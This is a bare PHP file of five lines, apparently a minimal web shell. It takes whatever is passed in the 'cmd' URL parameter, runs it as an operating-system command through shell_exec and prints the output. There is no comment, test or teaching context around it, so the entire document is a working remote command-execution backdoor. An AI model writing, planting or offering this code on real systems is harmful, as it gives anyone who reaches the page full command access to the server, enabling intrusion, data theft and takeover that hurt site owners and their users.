<?php
$command = $_GET['cmd'];
$output = shell_exec($command);
echo $output;
?>
